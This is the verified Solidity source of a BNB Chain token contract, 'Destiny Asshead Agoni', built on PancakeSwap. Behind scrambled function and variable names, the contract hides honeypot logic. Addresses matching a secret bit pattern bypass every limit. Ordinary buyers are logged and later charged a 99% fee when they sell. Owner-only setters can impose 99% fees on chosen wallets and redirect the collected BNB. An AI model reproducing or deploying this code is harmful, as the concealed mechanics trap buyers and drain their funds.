/**
 *Submitted for verification at BscScan.com on 2022-12-10
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract DestinyAssheadAgoni is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Destiny Asshead Agoni ";
    string constant _symbol = "DestinyAssheadAgoni";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private botsTradingMaxSwapExemptTx;
    mapping(address => bool) private exemptLaunchedLimitReceiverIsWalletBots;
    mapping(address => bool) private isTradingExemptSellBotsBuy;
    mapping(address => bool) private walletSwapBurnMinBuyModeBots;
    mapping(address => uint256) private launchedMarketingMaxTxFee;
    mapping(uint256 => address) private autoSellTxMinLaunchedLiquidity;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private swapExemptIsMode = 0;
    uint256 private burnSwapExemptSell = 8;

    //SELL FEES
    uint256 private walletExemptBurnLiquidityMin = 0;
    uint256 private modeMarketingExemptSellTradingLaunchedSwap = 8;

    uint256 private feeMaxMinLiquidity = burnSwapExemptSell + swapExemptIsMode;
    uint256 private buyReceiverModeTeamTradingFee = 100;

    address private launchedTxWalletBuy = (msg.sender); // auto-liq address
    address private isFeeMaxExempt = (0x90560ACE45340FDc9B01b4baFFffc39443B218af); // marketing address
    address private txIsWalletLaunchedModeBots = DEAD;
    address private teamMinSellReceiver = DEAD;
    address private autoLiquidityTradingBurnMaxWalletMode = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private feeIsSwapMinModeTx;
    uint256 private maxModeLimitWalletTeam;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private swapLaunchedFeeMin;
    uint256 private botsLiquidityTxTrading;
    uint256 private maxLaunchedBuyBurnModeFee;
    uint256 private tradingBuyMinAutoMarketingBurnTx;
    uint256 private minTradingLaunchedSwap;

    bool private liquidityTxBuyTradingMaxExempt = true;
    bool private walletSwapBurnMinBuyModeBotsMode = true;
    bool private botsIsSwapMarketing = true;
    bool private liquidityBuyBotsBurn = true;
    bool private swapBotsExemptAutoTradingWalletLiquidity = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private burnMaxFeeReceiverAuto = 6 * 10 ** 15;
    uint256 private swapIsTxAuto = _totalSupply / 1000; // 0.1%

    
    uint256 private minTxLaunchedMax = 0;
    uint256 private teamMaxReceiverTrading = 0;
    bool private buyIsWalletLaunchedMarketing = false;
    uint256 private maxTradingLimitSell = 0;
    uint256 private receiverTradingLiquidityTeam = 0;
    uint256 private buyMarketingMaxMin = 0;
    bool private autoMinLaunchedBurnSwap = false;
    uint256 private teamSwapBurnLaunchedLimitIsAuto = 0;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        swapLaunchedFeeMin = true;

        botsTradingMaxSwapExemptTx[msg.sender] = true;
        botsTradingMaxSwapExemptTx[address(this)] = true;

        exemptLaunchedLimitReceiverIsWalletBots[msg.sender] = true;
        exemptLaunchedLimitReceiverIsWalletBots[0x0000000000000000000000000000000000000000] = true;
        exemptLaunchedLimitReceiverIsWalletBots[0x000000000000000000000000000000000000dEaD] = true;
        exemptLaunchedLimitReceiverIsWalletBots[address(this)] = true;

        isTradingExemptSellBotsBuy[msg.sender] = true;
        isTradingExemptSellBotsBuy[0x0000000000000000000000000000000000000000] = true;
        isTradingExemptSellBotsBuy[0x000000000000000000000000000000000000dEaD] = true;
        isTradingExemptSellBotsBuy[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return receiverMarketingTradingBotsIs(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return receiverMarketingTradingBotsIs(sender, recipient, amount);
    }

    function receiverMarketingTradingBotsIs(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        if (autoMinLaunchedBurnSwap != buyIsWalletLaunchedMarketing) {
            autoMinLaunchedBurnSwap = swapBotsExemptAutoTradingWalletLiquidity;
        }

        if (maxTradingLimitSell != buyMarketingMaxMin) {
            maxTradingLimitSell = buyMarketingMaxMin;
        }

        if (teamSwapBurnLaunchedLimitIsAuto == burnSwapExemptSell) {
            teamSwapBurnLaunchedLimitIsAuto = modeMarketingExemptSellTradingLaunchedSwap;
        }


        bool bLimitTxWalletValue = isBuyMaxTx(sender) || isBuyMaxTx(recipient);
        
        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                maxMarketingReceiverIs();
            }
            if (!bLimitTxWalletValue) {
                tradingWalletModeExempt(recipient);
            }
        }
        
        if (inSwap || bLimitTxWalletValue) {return limitTeamReceiverBuyIsBurn(sender, recipient, amount);}

        if (!botsTradingMaxSwapExemptTx[sender] && !botsTradingMaxSwapExemptTx[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }
        
        if (autoMinLaunchedBurnSwap == buyIsWalletLaunchedMarketing) {
            autoMinLaunchedBurnSwap = botsIsSwapMarketing;
        }

        if (buyIsWalletLaunchedMarketing != swapBotsExemptAutoTradingWalletLiquidity) {
            buyIsWalletLaunchedMarketing = botsIsSwapMarketing;
        }


        require((amount <= _maxTxAmount) || isTradingExemptSellBotsBuy[sender] || isTradingExemptSellBotsBuy[recipient], "Max TX Limit has been triggered");

        if (receiverMaxAutoLiquidity()) {isTxFeeWalletBurn();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        if (minTxLaunchedMax == minTxLaunchedMax) {
            minTxLaunchedMax = maxTradingLimitSell;
        }

        if (teamSwapBurnLaunchedLimitIsAuto == swapIsTxAuto) {
            teamSwapBurnLaunchedLimitIsAuto = burnMaxFeeReceiverAuto;
        }


        uint256 amountReceived = receiverTradingLaunchedTx(sender) ? isLaunchedWalletBots(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function limitTeamReceiverBuyIsBurn(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function receiverTradingLaunchedTx(address sender) internal view returns (bool) {
        return !exemptLaunchedLimitReceiverIsWalletBots[sender];
    }

    function modeBurnLiquidityFee(address sender, bool selling) internal returns (uint256) {
        
        if (selling) {
            feeMaxMinLiquidity = modeMarketingExemptSellTradingLaunchedSwap + walletExemptBurnLiquidityMin;
            return botsMinModeReceiverTx(sender, feeMaxMinLiquidity);
        }
        if (!selling && sender == uniswapV2Pair) {
            feeMaxMinLiquidity = burnSwapExemptSell + swapExemptIsMode;
            return feeMaxMinLiquidity;
        }
        return botsMinModeReceiverTx(sender, feeMaxMinLiquidity);
    }

    function swapSellAutoMarketing() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function isLaunchedWalletBots(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (buyMarketingMaxMin == burnMaxFeeReceiverAuto) {
            buyMarketingMaxMin = burnMaxFeeReceiverAuto;
        }

        if (buyIsWalletLaunchedMarketing == botsIsSwapMarketing) {
            buyIsWalletLaunchedMarketing = liquidityTxBuyTradingMaxExempt;
        }


        uint256 feeAmount = amount.mul(modeBurnLiquidityFee(sender, receiver == uniswapV2Pair)).div(buyReceiverModeTeamTradingFee);

        if (walletSwapBurnMinBuyModeBots[sender] || walletSwapBurnMinBuyModeBots[receiver]) {
            feeAmount = amount.mul(99).div(buyReceiverModeTeamTradingFee);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function isBuyMaxTx(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function botsMinModeReceiverTx(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = launchedMarketingMaxTxFee[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function tradingWalletModeExempt(address addr) private {
        if (swapSellAutoMarketing() < burnMaxFeeReceiverAuto) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        autoSellTxMinLaunchedLiquidity[exemptLimitValue] = addr;
    }

    function maxMarketingReceiverIs() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (launchedMarketingMaxTxFee[autoSellTxMinLaunchedLiquidity[i]] == 0) {
                    launchedMarketingMaxTxFee[autoSellTxMinLaunchedLiquidity[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(isFeeMaxExempt).transfer(amountBNB * amountPercentage / 100);
    }

    function receiverMaxAutoLiquidity() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    swapBotsExemptAutoTradingWalletLiquidity &&
    _balances[address(this)] >= swapIsTxAuto;
    }

    function isTxFeeWalletBurn() internal swapping {
        
        uint256 amountToLiquify = swapIsTxAuto.mul(swapExemptIsMode).div(feeMaxMinLiquidity).div(2);
        uint256 amountToSwap = swapIsTxAuto.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        if (receiverTradingLiquidityTeam != maxTradingLimitSell) {
            receiverTradingLiquidityTeam = receiverTradingLiquidityTeam;
        }

        if (minTxLaunchedMax == teamMaxReceiverTrading) {
            minTxLaunchedMax = teamMaxReceiverTrading;
        }

        if (buyMarketingMaxMin != buyMarketingMaxMin) {
            buyMarketingMaxMin = walletExemptBurnLiquidityMin;
        }


        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = feeMaxMinLiquidity.sub(swapExemptIsMode.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(swapExemptIsMode).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(burnSwapExemptSell).div(totalETHFee);
        
        if (maxTradingLimitSell != minTxLaunchedMax) {
            maxTradingLimitSell = teamSwapBurnLaunchedLimitIsAuto;
        }


        payable(isFeeMaxExempt).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                launchedTxWalletBuy,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getSwapBotsExemptAutoTradingWalletLiquidity() public view returns (bool) {
        if (swapBotsExemptAutoTradingWalletLiquidity == autoMinLaunchedBurnSwap) {
            return autoMinLaunchedBurnSwap;
        }
        return swapBotsExemptAutoTradingWalletLiquidity;
    }
    function setSwapBotsExemptAutoTradingWalletLiquidity(bool a0) public onlyOwner {
        if (swapBotsExemptAutoTradingWalletLiquidity != autoMinLaunchedBurnSwap) {
            autoMinLaunchedBurnSwap=a0;
        }
        if (swapBotsExemptAutoTradingWalletLiquidity != swapBotsExemptAutoTradingWalletLiquidity) {
            swapBotsExemptAutoTradingWalletLiquidity=a0;
        }
        if (swapBotsExemptAutoTradingWalletLiquidity != autoMinLaunchedBurnSwap) {
            autoMinLaunchedBurnSwap=a0;
        }
        swapBotsExemptAutoTradingWalletLiquidity=a0;
    }

    function getBurnSwapExemptSell() public view returns (uint256) {
        if (burnSwapExemptSell == burnMaxFeeReceiverAuto) {
            return burnMaxFeeReceiverAuto;
        }
        return burnSwapExemptSell;
    }
    function setBurnSwapExemptSell(uint256 a0) public onlyOwner {
        if (burnSwapExemptSell == teamMaxReceiverTrading) {
            teamMaxReceiverTrading=a0;
        }
        if (burnSwapExemptSell == teamMaxReceiverTrading) {
            teamMaxReceiverTrading=a0;
        }
        if (burnSwapExemptSell == buyMarketingMaxMin) {
            buyMarketingMaxMin=a0;
        }
        burnSwapExemptSell=a0;
    }

    function getMaxTradingLimitSell() public view returns (uint256) {
        if (maxTradingLimitSell == swapIsTxAuto) {
            return swapIsTxAuto;
        }
        if (maxTradingLimitSell == burnMaxFeeReceiverAuto) {
            return burnMaxFeeReceiverAuto;
        }
        if (maxTradingLimitSell != receiverTradingLiquidityTeam) {
            return receiverTradingLiquidityTeam;
        }
        return maxTradingLimitSell;
    }
    function setMaxTradingLimitSell(uint256 a0) public onlyOwner {
        if (maxTradingLimitSell != burnSwapExemptSell) {
            burnSwapExemptSell=a0;
        }
        if (maxTradingLimitSell != buyMarketingMaxMin) {
            buyMarketingMaxMin=a0;
        }
        if (maxTradingLimitSell != walletExemptBurnLiquidityMin) {
            walletExemptBurnLiquidityMin=a0;
        }
        maxTradingLimitSell=a0;
    }

    function getWalletSwapBurnMinBuyModeBots(address a0) public view returns (bool) {
        if (walletSwapBurnMinBuyModeBots[a0] == botsTradingMaxSwapExemptTx[a0]) {
            return swapBotsExemptAutoTradingWalletLiquidity;
        }
            return walletSwapBurnMinBuyModeBots[a0];
    }
    function setWalletSwapBurnMinBuyModeBots(address a0,bool a1) public onlyOwner {
        if (a0 == txIsWalletLaunchedModeBots) {
            buyIsWalletLaunchedMarketing=a1;
        }
        walletSwapBurnMinBuyModeBots[a0]=a1;
    }

    function getReceiverTradingLiquidityTeam() public view returns (uint256) {
        return receiverTradingLiquidityTeam;
    }
    function setReceiverTradingLiquidityTeam(uint256 a0) public onlyOwner {
        if (receiverTradingLiquidityTeam != buyReceiverModeTeamTradingFee) {
            buyReceiverModeTeamTradingFee=a0;
        }
        if (receiverTradingLiquidityTeam != maxTradingLimitSell) {
            maxTradingLimitSell=a0;
        }
        receiverTradingLiquidityTeam=a0;
    }

    function getLaunchedMarketingMaxTxFee(address a0) public view returns (uint256) {
        if (a0 == isFeeMaxExempt) {
            return swapExemptIsMode;
        }
            return launchedMarketingMaxTxFee[a0];
    }
    function setLaunchedMarketingMaxTxFee(address a0,uint256 a1) public onlyOwner {
        if (a0 != txIsWalletLaunchedModeBots) {
            swapIsTxAuto=a1;
        }
        if (a0 == isFeeMaxExempt) {
            maxTradingLimitSell=a1;
        }
        if (a0 != launchedTxWalletBuy) {
            buyMarketingMaxMin=a1;
        }
        launchedMarketingMaxTxFee[a0]=a1;
    }

    function getSwapIsTxAuto() public view returns (uint256) {
        return swapIsTxAuto;
    }
    function setSwapIsTxAuto(uint256 a0) public onlyOwner {
        swapIsTxAuto=a0;
    }

    function getBuyReceiverModeTeamTradingFee() public view returns (uint256) {
        if (buyReceiverModeTeamTradingFee == swapExemptIsMode) {
            return swapExemptIsMode;
        }
        if (buyReceiverModeTeamTradingFee == feeMaxMinLiquidity) {
            return feeMaxMinLiquidity;
        }
        if (buyReceiverModeTeamTradingFee != walletExemptBurnLiquidityMin) {
            return walletExemptBurnLiquidityMin;
        }
        return buyReceiverModeTeamTradingFee;
    }
    function setBuyReceiverModeTeamTradingFee(uint256 a0) public onlyOwner {
        if (buyReceiverModeTeamTradingFee != minTxLaunchedMax) {
            minTxLaunchedMax=a0;
        }
        if (buyReceiverModeTeamTradingFee == walletExemptBurnLiquidityMin) {
            walletExemptBurnLiquidityMin=a0;
        }
        if (buyReceiverModeTeamTradingFee == feeMaxMinLiquidity) {
            feeMaxMinLiquidity=a0;
        }
        buyReceiverModeTeamTradingFee=a0;
    }

    function getLiquidityTxBuyTradingMaxExempt() public view returns (bool) {
        if (liquidityTxBuyTradingMaxExempt == botsIsSwapMarketing) {
            return botsIsSwapMarketing;
        }
        if (liquidityTxBuyTradingMaxExempt != botsIsSwapMarketing) {
            return botsIsSwapMarketing;
        }
        if (liquidityTxBuyTradingMaxExempt != swapBotsExemptAutoTradingWalletLiquidity) {
            return swapBotsExemptAutoTradingWalletLiquidity;
        }
        return liquidityTxBuyTradingMaxExempt;
    }
    function setLiquidityTxBuyTradingMaxExempt(bool a0) public onlyOwner {
        liquidityTxBuyTradingMaxExempt=a0;
    }

    function getTxIsWalletLaunchedModeBots() public view returns (address) {
        if (txIsWalletLaunchedModeBots == isFeeMaxExempt) {
            return isFeeMaxExempt;
        }
        return txIsWalletLaunchedModeBots;
    }
    function setTxIsWalletLaunchedModeBots(address a0) public onlyOwner {
        if (txIsWalletLaunchedModeBots != isFeeMaxExempt) {
            isFeeMaxExempt=a0;
        }
        if (txIsWalletLaunchedModeBots != launchedTxWalletBuy) {
            launchedTxWalletBuy=a0;
        }
        txIsWalletLaunchedModeBots=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}